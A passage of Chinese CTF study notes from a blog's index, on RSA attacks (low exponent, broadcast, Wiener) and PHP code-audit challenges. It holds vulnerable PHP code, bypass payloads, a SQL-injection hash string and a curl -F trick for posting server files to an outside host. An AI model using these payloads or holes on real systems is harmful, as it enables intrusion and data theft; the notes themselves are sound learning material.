* pow(c2, s2, n) % n flag = binascii.unhexlify(hex(m)[2:]) print (flag) ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x06 低加密指数攻击 在 RSA 中 e 也称为加密指数。但是如果me\u003cn的时候，就会造成安全问题。m=c1/e。 当me\u003en，但是不是非常大的时候，也会带来问题。c= me mod n，me = c + kn，所以就能爆破k来得到m。 #n: 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L #e: 0x3 #c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365 so,how to get the message? 解密核心代码： import gmpy2\rimport binascii\rfor k in range(100):\rm,f= gmpy2.iroot(c + k*n, 3)# 两个返回值，第二个返回值代表能否完全开方\rif f:\rflag = binascii.unhexlify(hex(m)[2:])\rprint(flag)\rexit(0)\r","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x07 低加密指数广播攻击 如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。选取了相同的加密指数 e（这里取 e=3），对相同的明文 m 进行了加密并进行了消息的传递，那么有： m = xxxxxxxx e = 65537 ========== n c ========== n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207 c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759 c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491 c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n = 2120696809731413100718342794448680195358315115144362794311373699677678718111106395796069809269680","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x08 低解密指数攻击 N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 import hashlib flag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\" 需要借助rsa-wiener-attack工具来解，核心代码： import RSAwienerHacker\rimport hashlib\rd = RSAwienerHacker.hack_RSA(e,n)\rflag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\"\rprint flag ","date":"2021-04-28","objectID":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","tags":["密码学","CTF"],"title":"RSA学习笔记","uri":"/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 弱类型相关要点及md5 $a == $b 等于TRUE，如果类型转换后$a 等于$b。 $a === $b 全等TRUE，如果$a 等于$b，并且它们的类型也相同。 如果一个数值和一个字符串比较，那么会将字符串转换为数值。 ''== 0 == false\r'123' == 123\r'abc' == 0\r'123a' == 123 0x01 == 1\r'0e123456789' == '0e987654321' [false] == [0] == [NULL] == ['']\rNULL == false == 0\rtrue == 1\rMD5案例1 \u003c?php\rini_set(\"display error\", false);\rerror_reporting(0);\rif($_POST['param1']!=$_POST['param2']\u0026\u0026md5($_POST['param1'])==md5($_POST['param2']))\r{\rdie(\"success\");\r}\relse\r{\recho \"fail\";\r}\r在PHP中，利用”!=”或”==”来对哈希值进行比较时，PHP会把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。参考：https://blog.csdn.net/nzjdsds/article/details/90085112 MD5案例2 \u003c?php\rini_set(\"display error\", false);\rerror_reporting(0);\rif($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2']))\r{\rdie(\"success\");\r}\relse\r{\recho \"fail\";\r}\r通过函数返回，返回不是md5，例如数组：param1[]=1\u0026param2[]=2 MD5案例3 \u003c?php\rini_set(\"display error\", false);\rerror_reporting(0);\rif((string)$_POST['param1']!==(string)$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2']))\r{\rdie(\"success\");\r}\relse\r{\recho \"fail\";\r}\rmd5强碰撞 通过python脚本解码 from urllib import parse a = parse.quote(open('1.txt','rb').read()) b = parse.quote(open('2.txt','rb').read()) print (\"a:\" + a + \"\\n\") print (\"b:\" + b) a:%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wi%C9r%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DBw4rH%D6%1B%8A%23%11%7C%D5%D8G%DE%8F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40%F9%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr~W%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3Bf%2AQ%05%EC b:%14%97%3DYd%EF%AC%9BF%FF%12%16%0AL%FA%1E9wiIr%9F%3D%AA%2C%F6x%B1%93.%10%A0%60%CB%BB%09%F2%0D.%29%CF%25%CB%FA%DB%F74rH%D6%1B%8A%23%11%7C%D5%D8G%DE%0F%19%7C%8D%BEd%C0C%D6x%91%D3%02G7/%E47%0C%1B%FA%9E%A7%40y%12%3B%A0%20%C9%7B%F5%C4%D1%19Y%A2%B7F%17%E20%DCrS%CF%B0%C0%EFr%FEV%E6%0A%E8%93KS%1E%F7%F0%CA%9A%3B%E6%2AQ%05%EC sha相关案例 \u003c?php\rini_set(\"display error\", false);\rerror_reporting(0);\r$flag = \"flag\";\rif(isset($_GET['name']) and isset($_GET['password']))\r{\rif ($_GET['name'] == $_GET['password'])\recho '\u003cp\u003eYour password can not br yout name!\u003c/p\u003e';\relse if (sha1($_GET['name']) === sha1($_GET['password'])\rdie('Flag:' .$flag);\relse\recho '\u003cp\u003eInvalid password.\u003c/p\u003e';\r}\relse\recho \"\u003cp\u003eLogin first!\u003c/p\u003e\";\r与 MD5案例2 类似 Md5与SQL注入的融合 \u003c?php\rerror_reporting(0);\r$link = mysql_connect('localhost','root','root');\rif(!$link){\rdie('Could not connect to MySQL: '.mysql_error());\r}\r$db = mysql_select_db(\"test\", $link);\rif(!$db)\r{\recho 'select db error';\rexit();\r}\r$password = $_GET['password'];\r$sql = \"SELECT * FROM admin WHERE pass = '\".md5($password, true).\"'\";\r$result=mysql_query($sql) or die('\u003cpre\u003e'. mysql_error().'\u003c/pre\u003e');\r$rowl= mysql_fetch_row($result);\rvar_dump($row1);\rmysql_close($link);\rmd5为true 时，返回 16 字符长度的原始二进制格式的摘要。例如：echo md5(‘ffifdyop’,true); ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 弱类型相关函数 JSON相关问题 \u003c?php\rhighlight_file(__FIlE__);\rinclude \"flag. php\";\rif (isset($_POST['message'])) {\r$message = json_decode($_POST['message']);\rif($message-\u003ekey == $key) {\recho $flag;\r}\relse {\recho \"fail\";\r}\r}\relse{\recho \"~~~~\";\r}\r?\u003e\rjson_decode对 JSON 格式的字符串进行解码，构造message={“key”:0}。 SWITCH相关问题 如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。 \u003c?php\rhighlight_file(__FIlE__);\r$i = \"3name\";\rswitch ($i){\rcase 0:\rcase 1:\rcase 2:\recho \"this is two\";\rbreak;\rcase 3:\recho \"flag\";\rbreak;\r}\r?\u003e\r执行的结果是flag。 STRCMP相关问题 strcmp(string $str1, string $str2)，二进制安全字符串比较，如果 str1 小于 str2 返回 \u003c 0； 如果 str1 大于 str2 返回 \u003e 0；如果两者相等，返回 0。比较过程应该是转化成ASCII后逐字节进行比较，然后根据运算结果来决定返回值。 strcmp(‘a’,1)–\u003e48， strcmp(‘1cc’,‘1ca’)–\u003e2。 \u003c?php\rhighlight_file(__FIlE__);\rinclude \"flag.php\";\rif(isset($_POST['password'])){\rif (strcmp($_POST['password'], $password)==0){\recho \"Right!!! login success\";\recho $flag;\rexit();\r} else {\recho \"Wrong password..\";\r}\r}\r?\u003e\r构造函数返回值为NULL，弱类型与0相等。 IN_ARRAY相关问题 in_array，检查数组中是否存在某个值，in_array(mixed$needle, array $haystack, bool $strict = false): bool。大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。 \u003c?php\rhighlight_file(__FIlE__);\r$array = [0,1,2,'3'];\rvar_dump(in_array('abc', $array));\rvar_dump(in_array('1bc', $array));\rvar_dump(in_array(3, $array));\r结果会是bool(true)，bool(true)，bool(true)。 ARRAY_SEARCH相关问题 array_search，在数组中搜索给定的值，如果成功则返回首个相应的键名，与上面的类似。 \u003c?php\rhighlight_file(__FIlE__);\r$array = [0,1,2,'3'];\rvar_dump(array_search('abc', $array));\rvar_dump(array_search('1bc', $array));\rvar_dump(array_search(3, $array));\rvar_dump(array_search('3', $array));\r结果为int(0)，int(1)，int(3)，int(3)。 此函数可能返回布尔值 false，但也可能返回等同于 false 的非布尔值。 \u003c?php\r#highlight_file(__FIlE__);\rinclude \"flag.php\"\rif(!is_array($_GET['test'])){exit();}\r$test = $_GET['test'];\rfor($ i= 0; $i\u003ccount($test); $i++){\rif($test[$i] === \"admin\"){\recho \"error\";\rexit();\r}\r$test[$i]=intval($test[$i]);\rif(array_search(\"admin\", $test)===0){\recho $flag;\r}\relse{\recho \"false\";\r}\r传入test[]=0，即可获得flag。 strpos相关问题 strpos，查找字符串首次出现的位置 如果逻辑中出现用strpos来做判断，那就有可能带来安全问题。 ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 变量覆盖问题 Extract() extract，从数组中将变量导入到当前的符号表。 范例 \u003c?php\r/* 假定 $var_array 是 wddx_deserialize 返回的数组*/\r$size = \"large\";\r$var_array = array(\"color\" =\u003e \"blue\",\r\"size\" =\u003e \"medium\",\r\"shape\" =\u003e \"sphere\");\rextract($var_array, EXTR_PREFIX_SAME, \"wddx\");\recho \"$color, $size, $shape, $wddx_size\\n\";\r?\u003e\rEXTR_PREFIX_SAME 如果有冲突，在变量名前加上前缀。输出结果为：blue, large, sphere, medium。 \u003c?php\rhighlight_file(__FIlE__);\rinclude \"flag.php\"\rextract($_GET);\rif(isset($gift)){\r$content = trim(file_get_contents($flag));\rif($gift == $content){\recho $trueflag;\r}\relse{\recho 'Oh..';\r}\r}\r?\u003e\r构造gift=\u0026flag=，得到flag。 $$ 遍历初始化变量，由于php中可以使用$$声明变量，因此当在遍历数组时可能会覆盖原来的值。 \u003c?php\rhighlight_file(__FIlE__);\r$a = \"helloworld\";\recho \"$a\";\recho \"\u003cbr\u003e\";\rforeach ($_GET as $key =\u003e $value) {\r$$key=$value;\r}\recho \"$a\";\r?\u003e\r如果构造a=123，就会输出helloworld，123。 \u003c?php\rhighlight_file(__FIlE__);\rinclude \"flag.php\"\r$_403 = \"Access Denied\";\r$_200 = \"Welcome Admin\";\rif ($_SERVER[\"REQUEST_METHOD\"] != \"POST\")\r{die(\"BugsBunnyCTF is here :p...\");}\rif ( !isset($_POST[\"flag\"]))\r{die($_403);}\rforeach ($_GET as $key =\u003e $value) {\r$$key=$$value;\r}\rforeach ($_POST as $key =\u003e $value) {\r$$key=$value;\r}\rif ( $_POST[\"flag\"]!==$flag)\r{die($_403);}\recho \"This is your flag :\".$flag.\"\\n\";\rdie($_200);\r?\u003e\r这里用POST随便传一个flag=111，GET传_200=flag，通过die($_200)得到flag。 parse_str() parse_str， 将字符串解析成多个变量。 范例 \u003c?php\r$str = \"first=value\u0026arr[]=foo+bar\u0026arr[]=baz\";\r// 推荐用法\rparse_str($str, $output);\recho $output['first']; // value\recho $output['arr'][0]; // foo bar\recho $output['arr'][1]; // baz\r// 不建议这么用\rparse_str($str);\recho $first; // value\recho $arr[0]; // foo bar\recho $arr[1]; // baz\r?\u003e\r\u003c?php\rinclude \"flag.php\"\rif (empty($_GET['id']))\r{\rshow_source(__FILE__);\rdie();\r}\relse\r{\rinclude ('flag.php');\r$a = 'www.OPENCT.com';\r$id = $_GET['id'];\r@parse_str($id);\rif ($a[0] != 'QNKCDZO' \u0026\u0026 md5($a[0]) == md5('QNKCDZO'))\r{\recho $flag;\r}\relse\r{\rexit('其实很简单其实并不难！');\r}\r}\r?\u003e\r构造id=a[0]=s878926199a，得到flag。 由于 PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。 ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 空白符问题 \u003c?php $info = \"\"; $req = []; $flag=\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"; ini_set(\"display_error\", false); //为一个配置选项设置值 error_reporting(0); //关闭所有PHP错误报告 # 条件一，要设置number参数 if(!isset($_GET['number'])){ header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt die(\"have a fun!!\"); //die — 等同于 exit() } foreach([$_GET, $_POST] as $global_var) { //foreach 语法结构提供了遍历数组的简单方式 foreach($global_var as $key =\u003e $value) { $value = trim($value); //trim — 去除字符串首尾处的空白字符（或者其他字符） is_string($value) \u0026\u0026 $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串 } } function is_palindrome_number($number) { $number = strval($number); //strval — 获取变量的字符串值 $i = 0; $j = strlen($number) - 1; //strlen — 获取字符串长度 while($i \u003c $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } # 条件二 number的值不能是数字 if(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 { $info=\"sorry, you cann't input a number!\"; } # 条件三 trim处理过的number要等于取整之后的值 elseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值 { $info = \"number must be equal to it's integer!! \"; } # 条件四 trim处理过的number经过反转之后要等于其本身 else { $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1!=$value2){ $info=\"no, this is not a palindrome number!\"; } else { if(is_palindrome_number($req[\"number\"])){ $info = \"nice! {$value1} is a palindrome number!\"; } else { $info=$flag; } } } echo $info; intval()成功时返回var 的integer 值，失败时返回0。空的array 返回0，非空的array 返回1。 最大的值取决于操作系统。32 位系统最大带符号的integer 范围是-2147483648 到2147483647。64 位系统上，最大带符号的integer 值是9223372036854775807。 浮点数的精度 is_numeric 如果不指定第二个参数，trim() 将去除这些字符： \" \" (ASCII 32 (0x20))，普通空格符。\r\"\\t\" (ASCII 9 (0x09))，制表符。\r\"\\n\" (ASCII 10 (0x0A))，换行符。\r\"\\r\" (ASCII 13 (0x0D))，回车符。\r\"\\0\" (ASCII 0 (0x00))，空字节符。\r\"\\x0B\" (ASCII 11 (0x0B))，垂直制表符。\r解法参考https://www.cnblogs.com/mkdd/p/13023618.html。 ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x04 伪随机数问题 mt_srand ，播下一个更好的随机数发生器种子。如果我们自己指定范围，如果过小则很容易被爆破出来的，因此大多实际应用中都是不指定范围，mt_rand()函数默认范围是0到mt_getrandmax()之间的伪随机数。 同时相同的种子生成的随机数是相同的，所以可以通过逆推mt_rand的种子来获得同页面的另一个rand的值。 工具：php_mt_seed ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x05 其他函数问题 运算符 \u003c?php\rinclude \"flag.php\"\r$a = 'test';\r$b = 'test2';\r$a = $_GET['a'];\r$b = $_GET['b'];\r$c = is_numeric($a) and is_numeric($b);\rif ($c){\rif (is_numeric($a)){\rif (is_numeric($b)){\recho \"is_numeric(b)\";\r}else{\recho $flag;\r}\r}else{\recho 'is_numeric(a) error';\r}\r}\relse{\rprint \"is_numeric(a) and is_numeric(b) error!\";\r}\r?\u003e\r所以$c = is_numeric($a) and is_numeric($b);实际上是\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e(\u003c/span\u003e$c = is_numeric($a)\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e)\u003c/span\u003e and is_numeric($b); parse_url parse_url ，解析 URL，返回其组成部分。本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。 范例 \u003c?php\r$url = 'http://username:password@hostname/path?arg=value#anchor';\rprint_r(parse_url($url));\recho parse_url($url, PHP_URL_PATH);\r?\u003e\r输出结果 Array\r(\r[scheme] =\u003e http\r[host] =\u003e hostname\r[user] =\u003e username\r[pass] =\u003e password\r[path] =\u003e /path\r[query] =\u003e arg=value\r[fragment] =\u003e anchor\r)\r/path\r如果指定了component 参数，parse_url() 返回一个string （或在指定为PHP_URL_PORT 时返回一个integer）而不是array。如果URL 中指定的组成部分不存在，将会返回NULL。http:///会被返回false。 \u003c?php\rinclude \"config.php\";\r$number1 = rand(1,100000000000000);\r$number2 = rand(1,100000000000);\r$number3 = rand(1,100000000);\r$url = urldecode($SERVER['REQUEST_URI']);\r$url = parse_url($url, PHP_URL_QUERY);\rif (preg_match(\"/_/i\", $url))\r{\rdie(\"...\");\r}\rif (preg_match(\"/0/i\", $url))\r{\rdie(\"...\");\r}\rif (preg_match(\"/\\w+/i\", $url))\r{\rdie(\"...\");\r}\rif(isset($GET['_']) \u0026\u0026 !empty($GET['_']))\r{\r$control = $GET['_'];\rif(!in_array($control, array(0,$number1)))\r{\rdie(\"fail1\");\r}\rif(!in_array($control, array(0,$number2)))\r{\rdie(\"fail2\");\r}\rif(!in_array($control, array(0,$number3)))\r{\rdie(\"fail3\");\r}\recho $flag;\r}\rshow_source(__FILE__);\r?\u003e\r可以构造///php/prase_url/ prase_url.php?_=a或者 ///php/prase_url/ prase_url.php?.=a escapeshellarg 和 escapeshellcmd escapeshellarg , 把字符串转码为可以在 shell 命令里使用的参数。escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 escapeshellcmd，shell 元字符转义。escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 \u003c?php print_r(escapeshellcmd(\"who 'ami\"));\rprint_r(escapeshellarg(\"who 'ami\"));\rprint_r(escapeshellcmd(\"who''ami\"));\rprint_r(escapeshellarg(\"who''ami\"));\r?\u003e\r对应的结果如下： who \\'ami\r'who '\\''ami'\rwho''ami\r'who'\\'''\\''ami'\r主要区别在于，对于单个单引号, escapeshellarg 函数转义后,会在字符串开始和结尾各加一个单引号，还会在被转义的单引号的左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义。 例题如下，分析参考https://blog.csdn.net/weixin_43999372/article/details/86631794 \u003c?php highlight_file('index.php'); function waf($a){ foreach($a as $key =\u003e $value){ if(preg_match('/flag/i',$key)){ exit('are you a hacker'); } } } /*循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。GET提交flag=123，接着通过POST请求提交 _GET[flag]=123，当开始遍历 $_POST 超全局数组的时候，$_k=_GET $__v=Array ( [flag] =\u003e 123 ) 所以__k 就是 $_GET,即GET提交的值Array ( [flag] =\u003e 123 )此时__k == $__v 成立，变量 $_GET就被删除。*/ foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =\u003e $__v) { if(isset($$__k) \u0026\u0026 $$__k == $__v) unset($$__k); } } } if($_POST) { waf($_POST);} if($_GET) { waf($_GET); } if($_COOKIE) { waf($_COOKIE);} /*extract把传递的_GET注册为$_GET,GET中传递的就有我们需要的参数*/ if($_POST) extract($_POST, EXTR_SKIP); if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET['flag'])){ if($_GET['flag'] === $_GET['hongri']){ exit('error'); } if(md5($_GET['flag'] ) == md5($_GET['hongri'])){ $url = $_GET['url']; $urlInfo = parse_url($url); if(!(\"http\" === strtolower($urlInfo[\"scheme\"]) || \"https\"===strtolower($urlInfo[\"scheme\"]))){ die( \"scheme error!\"); } $url = escapeshellarg($url); $url = escapeshellcmd($url); system(\"curl \".$url); } } ?\u003e 在 curl 中存在 -F 提交表单的方法，也可以提交文件。 -F \u003ckey=value\u003e 向服务器POST表单，例如： curl -F “web=@index.html;type=text/html” url.com 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了。目的构造的payload如下： GET请求： http://url?flag=aab","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x06 正则匹配相关问题 例题代码 \u003c?php\rfunction is_php($data){\rreturn preg_match('/\u003c\\?.*[(`;?\u003e].*/is', $data);\r}\rif(empty($_FILES)) {\rdie(show_source(__FILE__));\r}\r$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\r$data = file_get_contents($_FILES['file']['tmp_name']);\rif (is_php($data)) {\recho \"bad request\";\r} else {\r@mkdir($user_dir, 0755);\r$path = $user_dir . '/' . random_int(0, 10) . '.php';\rmove_uploaded_file($_FILES['file']['tmp_name'], $path);\rheader(\"Location: $path\", true, 303);\r}\r在https://regexper.com/输入/\u003c\\?.\u003cem\u003e[(`;?\u003e].\u003c/em\u003e/i，可以在线生成可视化的图像，方便分析。 正则表达式的贪婪与非贪婪模式 String str=“abcaxc”; Patter p=“ab.*c”; 贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。如上面使用模式p匹配字符串str，结果就是匹配到：abcaxc(ab.*c)。 非贪婪匹配：就是匹配到结果就好，就少的匹配字符。如上面使用模式p匹配字符串str，结果就是匹配到：abc(ab.*c)。 量词： {m,n}：m到n个\r*：任意多个\r+：一个到多个\r？：0或一个\r源字符串: aaab 正则: .*?b 匹配过程开始的时候, “.*?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.*?”, 这个时候, 